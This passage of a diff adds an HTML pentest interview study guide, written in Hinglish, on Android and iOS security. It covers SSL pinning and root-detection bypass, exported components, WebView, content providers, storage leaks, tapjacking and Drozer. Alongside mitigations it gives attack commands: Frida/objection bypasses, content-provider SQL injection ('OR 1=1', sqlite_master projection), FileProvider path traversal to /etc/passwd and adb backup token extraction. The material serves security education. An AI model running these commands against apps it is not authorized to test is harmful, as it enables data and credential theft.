+<li>Encrypt sensitive data (Android Keystore), never hardcode secrets.</li>
+<li>android:debuggable=false in release; allowBackup=false.</li>
+<li>WebView: JS off unless needed, no file access, safe bridge with allowlist.</li>
+<li>Export only necessary components with permission checks.</li>
+<li>Root/emulator detection + integrity checks (Play Integrity API).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>jadx mein strings search: password, secret, api_key, token.</li>
+<li>Manifest check: debuggable, allowBackup, exported components, permissions.</li>
+<li>SharedPreferences/DB files: adb backup/run-as se dump karo.</li>
+<li>WebView settings code review: setJavaScriptEnabled, addJavascriptInterface.</li>
+<li>Logcat: <code>adb logcat</code> — sensitive data log ho raha hai?</li>
+<li>MobSF report run karo — automated findings compare karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Banking APK mein debuggable=true + allowBackup=true — attacker adb backup se keystore/DB nikal kar tokens read kar leta hai. Fix: release build flags + no backup.</div>
+</section>
+
+<section class="topic" id="t43">
+<h2><span class="n">43</span>SSL Pinning — Types, Bypass (Android &amp; iOS)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>SSL pinning = app sirf specific CA/cert/public key accept karta hai, system trust store nahi — MITM (Burp/Fiddler) default mein fail ho jata hai. Types: <b>Certificate pinning</b> (exact cert), <b>Public key pinning</b> (SPKI hash — rotation-friendly), <b>CA pinning</b> (specific CA). Kyun use karte hain: corporate CA compromise, rogue CAs, enterprise proxies se bachav. <b>Bypass tools:</b> Android — Frida (<code>frida -U -f app -l ssl.js</code>), objection (<code>android sslpinning disable</code>), Xposed modules (JustTrustMe, TrustMeAlready), Magisk + system CA install, patching APK (apktool: <code>networkSecurityConfig</code> cleartext/certificates), Burp CA as system CA on rooted device. iOS — SSL Kill Switch 2, Frida/objection, Cycript, objection ios sslpinning disable, installing Burp CA (needs jailbreak for system trust). Root bypass separately: Magisk hide, Frida detection bypass, objection disable root detection.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Bina pinning bypass ke testing ruk jati hai; pinning bypass = MITM par full traffic visibility → data leak testing possible.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Pin public keys (not certs) with multiple backup pins for rotation.</li>
+<li>Use network security config (Android) + ATS (iOS) properly.</li>
+<li>Implement pinning in native code (not pure JS — easy to bypass).</li>
+<li>Add integrity checks (root/debugger/Frida detection) around pinning.</li>
+<li>Server-side anomaly detection for unusual client certs (defense in depth).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Burp CA install karke traffic dekho — certificate error aata hai? (pinning present)</li>
+<li>Frida: <code>objection -g com.app explore</code> → <code>android sslpinning disable</code>.</li>
+<li>Xposed: JustTrustMe module + Magisk.</li>
+<li>APK patch: apktool d → network_security_config.xml mein user CAs allow → rebuild.</li>
+<li>iOS: objection <code>ios sslpinning disable</code>, SSL Kill Switch 2.</li>
+<li>Pin rotate test: server cert update par app crash? (cert pin hardcoded)</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Fintech app ne cert pinning kiya tha — Frida script se <code>SSL_pinning bypass</code> karke Burp mein API traffic capture kiya → token in header mila → IDOR test successful. Fix: key pinning + integrity checks.</div>
+</section>
+
+<section class="topic" id="t44">
+<h2><span class="n">44</span>Rooted Devices — Risks, Exploitation, Root/Runtime Bypass Checks</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Rooted device = attacker ke paas full control (su, /system write). <b>Kya hota hai / exploit:</b> app data directory readable (<code>/data/data/com.app</code>), process memory dump (Fridump, gdb), SSL pinning bypass (system CA), Magisk se modules inject, keystore extraction, app integrity bypass, logs/databases nikalna, API tokens steal. <b>Checks to mitigate root:</b> su binary detection (<code>which su</code>, <code>/system/xbin/su</code>), Magisk detection, test-keys build check, busybox check, root packages check (SuperSU), write-permission to /system, SafetyNet/Play Integrity API, Frida detection (scan /proc maps, ports), emulator detection, debugger detection (TracerPid), tamper checks (signature, dex hash), runtime integrity verification (certificate hash comparison, code checksums, xHook/antifrida). <b>SDK checks:</b> SafetyNet attestation, Play Integrity, hardware-backed keystore. <b>Bypass:</b> Magisk (hide), Shamiko, Frida gadget with anti-detection (obfuscation, early instrumentation), objection <code>android root disable</code>, Xposed (RootCloak), patch smali checks.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Complete app data exposure, credential theft, fraud (rooted device par banking app abuse), repackaging attacks.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Play Integrity API (hardware-backed) — server-side validate attestation result.</li>
+<li>Multi-layer root checks: file-based + package-based + runtime.</li>
+<li>Never store secrets only client-side; encrypt with hardware Keystore keys.</li>
+<li>Server-side anomaly detection (device fingerprint, attestation, transaction risk).</li>
+<li>React to detection: degrade features / block sensitive flows, not just warn.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Magisk-rooted device par app chalao — kya detection hai? warning aati hai?</li>
+<li>Bypass: Magisk Hide + Shamiko — app ab bhi detect karta hai?</li>
+<li>Frida attach: <code>frida-ps -U</code> — app detect/exit karta hai?</li>
+<li>Memory dump: <code>fridump</code> — tokens/keys plaintext mein milte hain?</li>
+<li>/data/data access: <code>adb shell su -c 'ls /data/data/com.app/databases'</code>.</li>
+<li>Repackage: apktool se smali patch (root check nikal ke) — signature verify hota hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Banking app par root check sirf UI warning tha — rooted device par memory dump se transaction token steal karke fraud hua. Fix: server-side Play Integrity + hardware keystore.</div>
+</section>
+
+<section class="topic" id="t45">
+<h2><span class="n">45</span>Exported Components &amp; Intent Filters</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><code>android:exported="true"</code> = doosri apps (ya attacker) us component ko externally launch kar sakti hain bina permission. <b>Exploitation:</b> exported Activity — <code>adb shell am start -n com.app/.ProfileActivity --es user_id "123"</code> (sensitive data bypassing UI); exported Service — start/stop karke state tamper, AIDL abuse; exported BroadcastReceiver — crafted intents se actions trigger (OTP interception if receiver handles SMS, "admin action" broadcasts); intent filter = component ko kaunse implicit intents milein — attacker match karke trigger karta hai. Filter of intent ka role: Android security mein intent filters implicit intents ko route karte hain; exported=false + permission check se sirf authorized apps hi receive karein.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Auth bypass (sensitive screens directly), data theft, malware trigger, OTP/notification interception, DoS.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Export only required components; default exported=false on Android 12+.</li>
+<li>Guard exported components with custom permissions (signature-level).</li>
+<li>Validate all Intent extras/action/data server-side and in code.</li>
+<li>Never put sensitive data in broadcasts (use ordered/private broadcasts).</li>
+<li>Audit intent filters — minimize implicit intent exposure.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Manifest mein exported=true wale components list karo (jadx/apktool).</li>
+<li><code>adb shell am start -n pkg/.Activity --es token "x"</code> — bina login sensitive screen khulti hai?</li>
+<li>Drozer: <code>run app.activity.info -a pkg</code>, <code>run app.broadcast.send</code>.</li>
+<li>Broadcast: crafted intent se receiver trigger karo — action ho jata hai?</li>
+<li>Permission check: exported component bina permission callable hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Banking app ka "ForgotPasswordActivity" exported tha — attacker usse direct launch karke password reset flow bypass kar sakta tha. Fix: exported=false + internal navigation only.</div>
+</section>
+
+<section class="topic" id="t46">
+<h2><span class="n">46</span>WebView Security &amp; User-Controlled URLs</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>WebView = in-app browser. Risks: <b>JS enabled</b> + <b>addJavascriptInterface</b> — malicious JS app ka native code call karta hai (RCE class); <b>file access</b> (setAllowFileAccess) — <code>file://</code> se local files read; <b>MIME sniffing</b> — malformed content render; <b>user URLs direct load</b> (<code>loadUrl(userInput)</code>) — arbitrary page mein app ka bridge/chrome visible hai → phishing, token theft, JS injection in app context; <b>mixed content</b>; <b>cleartext traffic</b>. Why not load user URLs directly: attacker <code>javascript:</code>/evil page se app JS bridge exploit, session tokens via injected JS, crypto mining, fake UI overlay.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>RCE (JS bridge), local file theft, phishing within trusted app, token steal, account takeover.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>JS off by default; enable only for trusted content with allowlisted domains.</li>
+<li>Never use addJavascriptInterface with untrusted content; use @JavascriptInterface allowlist + message handlers carefully.</li>
+<li>setAllowFileAccess(false), setAllowContentAccess(false), safe browsing enabled.</li>
+<li>Validate URLs against allowlist before loadUrl; reject javascript:/data: schemes.</li>
+<li>Load remote content in WebView only over HTTPS with pinning.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Manifest/smali: setJavaScriptEnabled(true)? addJavascriptInterface kiske saath?</li>
+<li>WebView URL field: <code>javascript:alert(document.cookie)</code> daalo — execute hota hai?</li>
+<li>file:///etc/hosts ya file:///data/data/com.app/databases — read hota hai?</li>
+<li>HTML with <code>&lt;script&gt;window.MyBridge.getToken()&lt;/script&gt;</code> — bridge callable?</li>
+<li>Cleartext: <code>http://</code> URL load hota hai? (usesCleartextTraffic)</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>E-commerce app ne product URL user input se loadUrl kiya + JS bridge tha — attacker ne link bheja jo bridge se address book + token le gaya. Fix: allowlist + JS off for external content.</div>
+</section>
+
+<section class="topic" id="t47">
+<h2><span class="n">47</span>Content Providers — What They Are &amp; Exploitation</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>ContentProvider = app ka structured data ka interface (URI-based) jo doosri apps ko share karta hai: <code>content://com.app.provider/users</code>. <b>Exploit:</b> exported provider (bina permission) → <code>adb shell content query --uri content://com.app.provider/users</code> — usernames, tokens, passwords padho; URI path traversal (SQLi in provider query — <code>selection</code> injection); file provider misconfig (<code>file://</code> paths exposed via exported FileProvider); insert/update/delete bhi external se.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Data leakage (DBs, files), SQLi via provider, sensitive info disclosure — High.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Export providers only when needed; protect with signature-level permissions.</li>
+<li>Use FileProvider with strict paths.xml allowlist (no broad root paths).</li>
+<li>Parameterize provider queries; validate selection args (SQLi in providers).</li>
+<li>Never store secrets in provider-exposed tables.</li>
+<li>Minimal URI exposure: grantUriPermission instead of exported.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Manifest: <code>&lt;provider android:exported="true"&gt;</code> dhundho.</li>
+<li><code>adb shell content query --uri content://pkg.provider/users</code> — data aata hai?</li>
+<li>Selection SQLi: <code>--selection "id=1 OR 1=1"</code> — extra rows?</li>
+<li>FileProvider: paths.xml check karo — broad path shared hai?</li>
+<li>Drozer: <code>run app.provider.info -a pkg</code>, <code>run scanner.provider.injection</code>.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Messenger app ka provider exported — attacker ne content query se saare contacts + chat tokens nikaale. Fix: signature permission + unexport.</div>
+</section>
+
+<section class="topic" id="t48">
+<h2><span class="n">48</span>Android Storage / Backup / Logs — Real-Time Exploitation</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Sensitive data galat jagah: SharedPreferences/plaintext DB mein tokens; internal storage files readable (root); external storage (SDCard) — <b>business requirement read/write external storage</b> → use scoped storage, encrypt files, never store auth tokens, random filenames, avoid <code>WRITE_EXTERNAL_STORAGE</code> broad permission; <b>allowBackup=true</b> → <code>adb backup</code> se saara data (DB, prefs) nikal jata hai; <b>logs</b> — Log.d/i mein credentials/OTP; crash reports mein stack with data; <b>exploit real-time:</b> run-as (debuggable) → <code>run-as com.app cat /data/data/com.app/databases/app.db</code>, adb backup restore on attacker device, logcat grep password, memory dump.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Token/credential theft, offline analysis se data breach, session replay.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Encrypt at rest (Android Keystore / EncryptedSharedPreferences); secrets never plaintext.</li>
+<li>allowBackup=false; exclude sensitive files from backup rules.</li>
+<li>Never log secrets; sanitize crash reports (proguard + no sensitive fields).</li>
+<li>External storage: scoped storage, no auth material, encrypt files, per-file permissions.</li>
+<li>Release builds: debuggable=false, minify, remove dev backdoors.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li><code>adb shell run-as com.app ls /data/data/com.app/</code> — data readable?</li>
+<li><code>adb backup -f backup.ab com.app</code> — phir abe.jar se extract karke DB/prefs padho.</li>
+<li><code>adb logcat | grep -i "password\|token\|otp"</code> — sensitive log?</li>
+<li>SDCard: app ke files external storage mein plaintext?</li>
+<li>APK backup rules (backup_rules.xml) check karo — sensitive files excluded?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>App ne API token SharedPreferences mein plaintext store kiya + allowBackup=true — attacker backup extract karke token se doosre device par login kar liya. Fix: Keystore encryption + backup off.</div>
+</section>
+
+<section class="topic" id="t49">
+<h2><span class="n">49</span>Tapjacking (Android Clickjacking)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Android version of clickjacking: attacker app victim app ke upar transparent overlay (FLAG_WINDOW_IS_OBSCURED window) rakhti hai — victim invisible button (grant permission, install, approve) par tap karta hai. Also: <code>onFilterTouchEventForSecurity</code> check missing, FLAG_SECURE missing, overlay permission abuse, accessibility service abuse.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Unauthorized actions: permissions grant, transactions approve, malware install, settings change.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Set <code>FLAG_SECURE</code> for sensitive screens (blocks screenshots + overlays capture).</li>
+<li>Implement <code>onFilterTouchEventForSecurity</code> — reject obscured touches.</li>
+<li>Detect <code>SYSTEM_ALERT_WINDOW</code> / overlay apps at runtime on critical flows.</li>
+<li>Confirm critical actions with in-app dialog + re-auth/OTP.</li>
+<li>Screen pinning for payment sessions (optional hardening).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Overlay app banao (TYPE_APPLICATION_OVERLAY) jo victim ke approve button par fake button rakhe — click intercepted?</li>
+<li>Manifest/activity check: FLAG_SECURE set hai sensitive screens par?</li>
+<li>onFilterTouchEventForSecurity implemented hai? (smali review)</li>
+<li>Permission dialog tapjacking: overlay se "Allow" par tap karwao.</li>
+<li>Accessibility service ke through touch injection test.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Banking app ke payment confirm button par attacker overlay — victim "Claim Reward" par tap karta hai, actually payment approve ho jata hai. Fix: FLAG_SECURE + obscured-touch rejection.</div>
+</section>
+
+<section class="topic" id="t50">
+<h2><span class="n">50</span>Drozer — LFI &amp; SQLi Exploitation on Android</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Drozer (MWR) = Android security assessment framework jo device par agent (shell) + PC console use karta hai. <b>Content provider SQLi:</b> <code>run scanner.provider.injection -a com.app</code> → vulnerable providers detect; phir <code>run app.provider.query --uri content://com.app.provider/users --selection "1=1"</code> — union/boolean injection se data dump. <b>File read (LFI via providers):</b> <code>run app.provider.read --uri content://com.app.FileProvider/../../../../etc/hosts</code> — path traversal se local files read (file-based LFI); content:// traversal via <code>%2e%2e</code>. Also: app.activity.info (exported activities), app.broadcast.send (receiver trigger), app.provider.info, scanner.modules.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Provider SQLi → DB dump (users/tokens); file traversal → source/configs read; exported component abuse → auth bypass.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Unexport providers / signature permissions (SQLi surface khatam).</li>
+<li>Parameterize provider queries; validate URIs (canonicalize, reject traversal).</li>
+<li>FileProvider strict paths.xml; never share root paths.</li>
+<li>Regular Drozer scans in CI security pipeline.</li>
+<li>Patch provider code same as web SQLi (parameterized selection).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Setup: device par drozer-agent.apk, PC: <code>adb forward tcp:31415 tcp:31415</code>, <code>drozer console connect</code>.</li>
+<li><code>run app.provider.info -a com.app</code> — exported providers list.</li>
+<li><code>run scanner.provider.injection -a com.app</code> — SQLi vulnerable provider milega.</li>
+<li><code>run app.provider.query --uri content://.../users --projection "* FROM sqlite_master--"</code>.</li>
+<li>File read: <code>run app.provider.read --uri content://com.app.FileProvider/../../../../etc/passwd</code>.</li>
+<li>Broadcast: <code>run app.broadcast.send --action com.app.intent.ADMIN_ACTION</code>.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Drozer scan se mila exported provider with SQLi — <code>scanner.provider.injection</code> se DB dump kiya: 10k users + auth tokens. Fix: unexport + parameterized queries.</div>
+</section>
+
+</main>
+</div>
+
+<footer>Pentest Interview Master Guide — Part 1 · Web, API &amp; Mobile fundamentals · Open index.html in browser</footer>
+
+<script>
+const q=document.getElementById('q'),count=document.getElementById('count');
+const topics=Array.from(document.querySelectorAll('.topic'));
+const cats=Array.from(document.querySelectorAll('.category'));
+const navLinks=Array.from(document.querySelectorAll('nav a'));
+function update(){
+  const t=q.value.toLowerCase().trim();
+  let vis=0;
+  topics.forEach(tp=>{
+    const show=!t||tp.textContent.toLowerCase().includes(t);
+    tp.style.display=show?'':'none';
+    if(show)vis++;
+  });
+  cats.forEach(c=>{
+    let any=false;
+    topics.forEach(tp=>{
+      if(tp.style.display!=='none'&&tp.previousElementSibling===c)any=true;
+    });
+    c.style.display=any?'':'none';
+  });
+  navLinks.forEach(a=>{
+    const id=a.getAttribute('href').slice(1);
+    const tp=document.getElementById(id);
+    a.style.display=(tp&&tp.style.display!=='none')?'':'none';
+  });
+  count.textContent=vis+' topics';
+}
+q.addEventListener('input',update);
+</script>
+</body>
+</html>
